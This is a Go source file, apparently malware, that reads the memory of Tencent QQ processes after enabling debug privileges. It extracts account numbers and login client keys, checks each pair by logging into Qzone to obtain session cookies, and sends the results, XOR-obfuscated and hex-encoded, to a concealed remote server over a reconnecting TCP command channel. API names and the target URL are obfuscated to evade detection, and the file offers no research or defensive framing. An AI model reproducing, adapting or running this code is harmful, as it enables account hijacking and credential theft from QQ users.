package main

import (
	"bufio"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/http/cookiejar"
	"os"
	"regexp"
	"strings"
	"sync"
	"syscall"
	"time"
	"unicode"
	"unsafe"

	"github.com/bytedance/sonic"
)

const (
	MEM_COMMIT                = 0x00001000
	PAGE_READONLY             = 0x02
	PAGE_READWRITE            = 0x04
	PAGE_EXECUTE_READ         = 0x20
	PAGE_EXECUTE_READWRITE    = 0x40
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_READ           = 0x0010
	PROCESS_VM_OPERATION      = 0x0008

	ERROR_SUCCESS           = 0
	SE_PRIVILEGE_ENABLED    = 0x00000002
	SE_DEBUG_NAME           = "SeDebugPrivilege" //SeDebugPrivilege
	TOKEN_ADJUST_PRIVILEGES = 0x0020
	TOKEN_QUERY             = 0x0008
)

type MEMORY_BASIC_INFORMATION struct {
	BaseAddress       uintptr
	AllocationBase    uintptr
	AllocationProtect uint32
	RegionSize        uintptr
	State             uint32
	Protect           uint32
	Type_             uint32
}

type LUID struct {
	LowPart  uint32
	HighPart int32
}

type LUID_AND_ATTRIBUTES struct {
	luid       LUID
	attributes uint32
}

type TOKEN_PRIVILEGES struct {
	privilege_count uint32
	privileges      [1]LUID_AND_ATTRIBUTES
}

func hexToStr(hexStr string) string {
	result := make([]byte, 0, len(hexStr)/2)
	for i := 0; i < len(hexStr); i += 2 {
		var b byte
		fmt.Sscanf(hexStr[i:i+2], "%02x", &b)
		result = append(result, b)
	}
	return string(result)
}

var (
	kernel32 = syscall.NewLazyDLL(xorDecrypt([]byte{0x09, 0x04, 0x1B, 0x02, 0x54, 0x0E, 0x52, 0x5B, 0x42, 0x56, 0x0E, 0x0D}))
	advapi32 = syscall.NewLazyDLL(xorDecrypt([]byte{0x03, 0x05, 0x1F, 0x0D, 0x41, 0x0B, 0x52, 0x5B, 0x42, 0x56, 0x0E, 0x0D}))

	OpenProcess           = kernel32.NewProc(xorDecrypt([]byte{0x2D, 0x11, 0x0C, 0x02, 0x61, 0x10, 0x0E, 0x0A, 0x09, 0x41, 0x11}))
	CloseHandle           = kernel32.NewProc(xorDecrypt([]byte{0x21, 0x0D, 0x06, 0x1F, 0x54, 0x2A, 0x00, 0x07, 0x08, 0x5E, 0x07}))
	ReadProcessMemory     = kernel32.NewProc(xorDecrypt([]byte{0x30, 0x04, 0x08, 0x08, 0x61, 0x10, 0x0E, 0x0A, 0x09, 0x41, 0x11, 0x2C, 0x0C, 0x01, 0x5C, 0x10, 0x18}))
	VirtualQueryEx        = kernel32.NewProc(xorDecrypt([]byte{0x34, 0x08, 0x1B, 0x18, 0x44, 0x03, 0x0D, 0x38, 0x19, 0x57, 0x10, 0x18, 0x2C, 0x14}))
	GetLastError          = kernel32.NewProc(xorDecrypt([]byte{0x25, 0x04, 0x1D, 0x20, 0x50, 0x11, 0x15, 0x2C, 0x1E, 0x40, 0x0D, 0x13}))
	OpenProcessToken      = advapi32.NewProc(xorDecrypt([]byte{0x2D, 0x11, 0x0C, 0x02, 0x61, 0x10, 0x0E, 0x0A, 0x09, 0x41, 0x11, 0x35, 0x06, 0x07, 0x56, 0x0C}))
	LookupPrivilegeValue  = advapi32.NewProc(xorDecrypt([]byte{0x2E, 0x0E, 0x06, 0x07, 0x44, 0x12, 0x31, 0x1B, 0x05, 0x44, 0x0B, 0x0D, 0x0C, 0x0B, 0x56, 0x34, 0x00, 0x05, 0x19, 0x51, 0x35}))
	AdjustTokenPrivileges = advapi32.NewProc(xorDecrypt([]byte{0x23, 0x05, 0x03, 0x19, 0x42, 0x16, 0x35, 0x06, 0x07, 0x57, 0x0C, 0x31, 0x1B, 0x05, 0x45, 0x0B, 0x0D, 0x0C, 0x0B, 0x51, 0x11}))
)

func enableDebugPrivilege() error {
	var tokenHandle syscall.Handle
	currentProcess, err := syscall.GetCurrentProcess()
	if err != nil {
		return nil
	}
	r1, _, err := OpenProcessToken.Call(
		uintptr(currentProcess),
		uintptr(TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY),
		uintptr(unsafe.Pointer(&tokenHandle)),
	)
	if r1 == 0 {
		return nil
	}
	defer CloseHandle.Call(uintptr(tokenHandle))
	var luid LUID
	seDebugName, _ := syscall.UTF16PtrFromString(SE_DEBUG_NAME)
	r1, _, err = LookupPrivilegeValue.Call(
		0,
		uintptr(unsafe.Pointer(seDebugName)),
		uintptr(unsafe.Pointer(&luid)),
	)
	if r1 == 0 {
		return nil
	}

	tokenPrivileges := TOKEN_PRIVILEGES{
		privilege_count: 1,
		privileges: [1]LUID_AND_ATTRIBUTES{
			{
				luid:       luid,
				attributes: SE_PRIVILEGE_ENABLED,
			},
		},
	}

	r1, _, err = AdjustTokenPrivileges.Call(
		uintptr(tokenHandle),
		0,
		uintptr(unsafe.Pointer(&tokenPrivileges)),
		0,
		0,
		0,
	)
	if r1 == 0 {
		return nil
	}

	r1, _, _ = GetLastError.Call()
	if r1 != ERROR_SUCCESS {
		return nil
	}

	return nil
}

func openProcess(processID uint32) (syscall.Handle, error) {
	if err := enableDebugPrivilege(); err != nil {
	}

	access := PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_OPERATION
	r1, _, err := OpenProcess.Call(
		uintptr(access),
		0,
		uintptr(processID),
	)
	if r1 == 0 {
		access = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ
		r1, _, err = OpenProcess.Call(
			uintptr(access),
			0,
			uintptr(processID),
		)
		if r1 == 0 {
			return 0, err
		}
	}

	return syscall.Handle(r1), nil
}

func readMemory(handle syscall.Handle, address uintptr, size uintptr) ([]byte, error) {
	buffer := make([]byte, size)
	var bytesRead uintptr
	r1, _, err := ReadProcessMemory.Call(
		uintptr(handle),
		address,
		uintptr(unsafe.Pointer(&buffer[0])),
		size,
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if r1 == 0 {
		return nil, err
	}
	if bytesRead != size {
		return nil, nil
	}

	return buffer, nil
}

func queryMemory(handle syscall.Handle, address uintptr) (*MEMORY_BASIC_INFORMATION, error) {
	var mbi MEMORY_BASIC_INFORMATION
	r1, _, err := VirtualQueryEx.Call(
		uintptr(handle),
		address,
		uintptr(unsafe.Pointer(&mbi)),
		unsafe.Sizeof(mbi),
	)
	if r1 == 0 {
		return nil, err
	}

	return &mbi, nil
}

func patternMatch(data, pattern []byte, mask string) bool {
	if len(data) < len(pattern) || len(mask) != len(pattern) {
		return false
	}

	for i := 0; i < len(pattern); i++ {
		if mask[i] != '?' && data[i] != pattern[i] {
			return false
		}
	}

	return true
}

func searchPattern(handle syscall.Handle, pattern []byte, mask string, startAddr, endAddr uintptr) []uintptr {
	var results []uintptr
	currentAddr := startAddr

	for currentAddr < endAddr {
		mbi, err := queryMemory(handle, currentAddr)
		if err != nil {
			currentAddr += 0x1000
			continue
		}

		if mbi.State == MEM_COMMIT && (mbi.Protect&(PAGE_READONLY|PAGE_READWRITE|PAGE_EXECUTE_READ|PAGE_EXECUTE_READWRITE) != 0) {
			regionSize := mbi.RegionSize
			if currentAddr+regionSize > endAddr {
				regionSize = endAddr - currentAddr
			}

			memoryData, err := readMemory(handle, currentAddr, regionSize)
			if err == nil {
				for i := 0; i <= len(memoryData)-len(pattern); i++ {
					if patternMatch(memoryData[i:], pattern, mask) {
						results = append(results, currentAddr+uintptr(i))
					}
				}
			}
		}

		currentAddr += mbi.RegionSize
	}

	return results
}

func findBetweenBytePatterns(handle syscall.Handle, startPattern, endPattern []byte, startAddr, endAddr uintptr) ([]string, error) {
	var results []string

	startAddrs := searchPattern(handle, startPattern, createMask(startPattern), startAddr, endAddr)
	if len(startAddrs) == 0 {
		//fmt.Errorf("nonelllcnm")
	}
	endAddrs := searchPattern(handle, endPattern, createMask(endPattern), startAddr, endAddr)
	if len(endAddrs) == 0 {
		//fmt.Errorf("noneendjdskjsh")
	}

	endAddrMap := make(map[uintptr]bool)
	for _, addr := range endAddrs {
		endAddrMap[addr] = true
	}

	for _, start := range startAddrs {
		startEnd := start + uintptr(len(startPattern))
		var nearestEnd uintptr
		for end := range endAddrMap {
			if end > startEnd && (nearestEnd == 0 || end < nearestEnd) {
				nearestEnd = end
			}
		}
		if nearestEnd == 0 {
			continue
		}
		targetLen := nearestEnd - startEnd
		if targetLen <= 0 || targetLen > 1024 {
			continue
		}

		data, err := readMemory(handle, startEnd, targetLen)
		if err != nil {
			continue
		}

		if str := tryConvertToString(data); str != "" {
			match, _ := regexp.MatchString("^[0-9]+$", str)
			if match {
				results = append(results, str)
			}

		}
	}
	if len(results) == 0 {
		return nil, nil
	}
	return results, nil
}
func createMask(pattern []byte) string {
	mask := make([]byte, len(pattern))
	for i := range mask {
		mask[i] = 'x'
	}
	return string(mask)
}

func tryConvertToString(data []byte) string {
	if len(data)%2 == 0 {
		u16s := make([]uint16, len(data)/2)
		for i := 0; i < len(u16s); i++ {
			u16s[i] = binary.LittleEndian.Uint16(data[i*2:])
		}
		str := syscall.UTF16ToString(u16s)
		if isPrintable(str) {
			return str
		}
	}
	if isPrintable(string(data)) {
		return string(data)
	}

	return ""
}

func isPrintable(s string) bool {
	for _, r := range s {
		if !unicode.IsPrint(r) && !unicode.IsSpace(r) {
			return false
		}
	}
	return len(s) > 0
}
func removeDuplicates[T comparable](slice []T) []T {
	seen := make(map[T]struct{})
	result := []T{}
	for _, item := range slice {
		if _, ok := seen[item]; !ok {
			seen[item] = struct{}{}
			result = append(result, item)
		}
	}
	return result
}

var ClientKeys []string
var Uins []string

func ydbyl(PID uint32, Wg *sync.WaitGroup) {
	defer Wg.Done()

	handle, err := openProcess(PID)
	if err != nil {
		log.Fatalf("openfailcnmb %v", err)
	}
	//fmt.Printf("[+] %d", PID)
	defer CloseHandle.Call(uintptr(handle))
	startAddr := uintptr(0x00000000)
	endAddr := uintptr(0x00007fffffffffff)
	startPattern := []byte{'T', 'e', 'n', 'c', 'e', 'n', 't', ' ', 'F', 'i', 'l', 'e', 's', '\\'}
	endPattern := []byte{'\\', 'n', 't', '_', 'q', 'q', '\\', 'n', 't', '_', 'd', 'a', 't', 'a'}
	paths, err := findBetweenBytePatterns(
		handle,
		startPattern,
		endPattern,
		startAddr,
		endAddr,
	)
	if len(paths) != 0 {
		httpuin = append(httpuin, paths...)
	}
	targetBytes := []byte{
		0x04, 0x30, 0x80, 0x80, 0x80,
		0x04, 0x38, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x42, 0x60,
	}
	mask := generateString("x", 7) + generateString("?", 5) + generateString("x", 2)
	foundAddresses := searchPattern(handle, targetBytes, mask, startAddr, endAddr)
	midbyte := extractMiddleBytes(targetBytes)
	for len(foundAddresses) == 0 {
		midbyte = extractMiddleBytes(targetBytes)
		demidbyte := deleteByte(midbyte, 1)
		if len(midbyte) == 1 {
			//fmt.Printf("[+]PID：%d -> NULL\n", PID)
			return

		}
		targetBytes = append(targetBytes[:7+len(demidbyte)], 0x42, 0x60)
		mask = generateString("x", 7) + generateString("?", len(demidbyte)) + generateString("x", 2)
		foundAddresses = searchPattern(handle, targetBytes, mask, startAddr, endAddr)
	}
	foundAddress := foundAddresses[0]
	//fmt.Printf("0x%X\n", foundAddress)

	resultBuffer := make([]byte, 96)
	bytesRead, err := readMemory(handle, foundAddress+uintptr(len(targetBytes)), uintptr(len(resultBuffer)))
	if err != nil {
		log.Fatalf("读取数据失败: %v", err)
	}

	//fmt.Printf(" %d \n", len(bytesRead))

	//fmt.Printf("[+]PID %d->ClientKey:%s\n", PID, bytesRead)
	//send(string(bytesRead))
	ClientKeys = append(ClientKeys, string(bytesRead))
	//fmt.Println(ClientKeys)
	//Bulider.WriteString("[Key]" + string(bytesRead))

}

type Client struct {
	Uin string `json:"Uin"`
	Key string `json:"Key"`
}

type JsonData struct {
	Time   int64    `json:"Time"` // 使用int64存储时间戳
	Client []Client `json:"Client"`
}

func printuin() []byte {

	qcuin := removeDuplicates(httpuin)
	qckey := removeDuplicates(ClientKeys)
	for _, uu := range qcuin {
		Uins = append(Uins, uu)

	}
	var qcck []string
	for _, qk := range qckey {
		qcck = append(qcck, qk)

	}
	data := JsonData{
		Time:   time.Now().Unix(),
		Client: []Client{},
	}

	for _, uin := range Uins {
		for _, k := range qckey {
			if Loginqkey(uin, k) {
				data.Client = append(data.Client, Client{Uin: uin, Key: k})
			}
		}
	}
	jsonData, _ := sonic.MarshalIndent(data, "", "    ")

	//
	Fdata := []byte(hex.EncodeToString([]byte(xorDecrypt(jsonData))) + "\n")
	//

	return Fdata

}

var (
	Qzone = xorDecrypt([]byte{0x0A, 0x15, 0x1D, 0x1C, 0x42, 0x58, 0x4E, 0x46, 0x1F, 0x41, 0x0E, 0x4F, 0x19, 0x18, 0x5F, 0x0D, 0x06, 0x00, 0x02, 0x06, 0x4C, 0x10, 0x18, 0x42, 0x52, 0x0D, 0x0C, 0x46, 0x06, 0x47, 0x0F, 0x11, 0x56, 0x1C, 0x47, 0x0E, 0x00, 0x07, 0x0B, 0x09, 0x53, 0x51, 0x5A, 0x5F, 0x17, 0x01, 0x0D, 0x00, 0x09, 0x5C, 0x16, 0x14, 0x00, 0x02, 0x0E, 0x19, 0x14, 0x00, 0x02, 0x49, 0x44, 0x02, 0x05, 0x05, 0x54, 0x0C, 0x15, 0x02, 0x09, 0x4B, 0x5F, 0x1A, 0x02, 0x09, 0x4A, 0x1F, 0x47, 0x1C, 0x5D, 0x09, 0x0A, 0x15, 0x1D, 0x1C, 0x42, 0x58, 0x4E, 0x46, 0x19, 0x41, 0x07, 0x13, 0x47, 0x1D, 0x49, 0x0D, 0x0F, 0x0C, 0x42, 0x45, 0x13, 0x4F, 0x0A, 0x03, 0x5C, 0x4D, 0x1A, 0x1C, 0x05, 0x5C, 0x1F, 0x4E, 0x00, 0x02, 0x55, 0x0D, 0x02, 0x0C, 0x02, 0x40, 0x07, 0x13, 0x4F, 0x1F, 0x5E, 0x17, 0x13, 0x0A, 0x09, 0x0F, 0x12, 0x00, 0x07, 0x09, 0x5F, 0x11, 0x15, 0x08, 0x1E, 0x12, 0x09, 0x04, 0x10, 0x05, 0x5F, 0x06, 0x04, 0x11, 0x51, 0x03, 0x5B}) //https://ssl.ptlogin2.qq.com/jump?ptlang=1033&clientuin={uin}&clientkey={key}&u1=https://user.qzone.qq.com/{uin}/infocenter&source=panelstar&keyindex=19
)

func Getcookiebykey(uin string, clientkey string, url string) []*http.Cookie {
	replacer := strings.NewReplacer(
		"{uin}", uin,
		"{key}", clientkey,
	)
	url1 := replacer.Replace(url)
	jar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar: jar,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return nil
		},
	}
	req, err := http.NewRequest("GET", url1, nil)
	if err != nil {

	}

	//req.Header.Set("User-Agent", "Mozilla/5.0")

	resp, err := client.Do(req)
	defer resp.Body.Close()
	_, err = io.ReadAll(resp.Body)
	if err != nil {

	}

	cookies := jar.Cookies(resp.Request.URL)

	return cookies

}
func Loginqkey(uin string, key string) bool {
	Ck := Getcookiebykey(uin, key, Qzone)
	if len(Ck) < 2 {
		return false
	}
	return true
}

func mamwllt(a bool) {
	if !a {
		rand.Seed(time.Now().UnixNano())
	} else {
		rand.Seed(time.Now().UnixNano())
		fmt.Println(9844848)
	}
	decoded, _ := hex.DecodeString(string([]byte{0x37, 0x34, 0x36, 0x33, 0x37, 0x30}))
	notr := strings.TrimSpace(iport)
	de1, _ := hex.DecodeString(notr)
	decip := xorDecrypt(de1)
	retryDelay := time.Second * 5

	conn, err := net.Dial(string(decoded), decip)
	if err != nil {
		for {
			time.Sleep(retryDelay)
			mamwllt(true)
		}
	}

	for {
		reader, err2 := bufio.NewReader(conn).ReadString('\n')
		if err2 != nil {
			fmt.Println(err2)
			conn.Close()
			mamwllt(true)
		}
		decoded, _ = hex.DecodeString(reader)
		fdecode := xorDecrypt(decoded)
		switch fdecode {
		case "Get":
			if aab(true) {
				a := printuin()
				fmt.Println(string(a))
				conn.Write(a)
			}
		default:
			os.Exit(0)
		}

	}
}

func deleteByte(data []byte, index int) []byte {
	if index < 0 || index >= len(data) {
		return data
	}
	result := make([]byte, len(data)-1)
	copy(result[:index], data[:index])
	copy(result[index:], data[index+1:])
	return result
}
func extractMiddleBytes(targetBytes []byte) []byte {
	prefix := []byte{0x04, 0x30, 0x80, 0x80, 0x80, 0x04, 0x38}
	suffix := []byte{0x42, 0x60}
	prefixEnd := -1
	for i := 0; i <= len(targetBytes)-len(prefix); i++ {
		match := true
		for j := 0; j < len(prefix); j++ {
			if targetBytes[i+j] != prefix[j] {
				match = false
				break
			}
		}
		if match {
			prefixEnd = i + len(prefix)
			break
		}
	}

	if prefixEnd == -1 {
		return nil
	}
	suffixStart := -1
	for i := prefixEnd; i <= len(targetBytes)-len(suffix); i++ {
		match := true
		for j := 0; j < len(suffix); j++ {
			if targetBytes[i+j] != suffix[j] {
				match = false
				break
			}
		}
		if match {
			suffixStart = i
			break
		}
	}

	if suffixStart == -1 {
		return nil
	}
	return targetBytes[prefixEnd:suffixStart]
}

func generateString(content string, count int) string {
	var builder strings.Builder
	for i := 0; i < count; i++ {
		builder.WriteString(content)
	}
	return builder.String()
}
